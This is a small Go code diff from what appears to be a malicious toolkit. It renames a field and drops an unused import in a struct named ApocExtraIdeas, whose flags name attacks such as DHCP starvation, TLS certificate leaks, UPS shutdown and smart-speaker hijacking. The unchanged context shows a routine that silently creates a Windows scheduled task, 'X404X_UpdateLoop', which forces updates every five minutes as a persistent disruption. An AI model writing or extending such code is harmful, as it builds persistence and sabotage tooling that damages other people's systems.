@@ -10,7 +10,7 @@ import (
 	"os/exec"
 	"path/filepath"
 	"runtime"
-	"strings"
+	
 	"time"
 )
 
@@ -249,7 +249,7 @@ type ApocExtraIdeas struct {
 	TLSCertLeak        bool
 	UPSShutdown        bool
 	DHCPStarve         bool
-	UpdateLoopAttack   bool
+	UpdateLoopActive   bool
 	SmartSpeakerHijack  bool
 	IdentityMining     bool
 	CompetitorAttack   bool
@@ -306,7 +306,7 @@ func (ae *ApocExtraIdeas) UpdateLoopAttack() bool {
 	if runtime.GOOS == "windows" {
 		exec.Command("schtasks", "/create", "/tn", "X404X_UpdateLoop", "/tr", "wuauclt /detectnow /updatenow", "/sc", "minute", "/mo", "5", "/f").Start()
 	}
-	ae.UpdateLoopAttack = true
+	ae.UpdateLoopActive = true
 	return true
 }
 
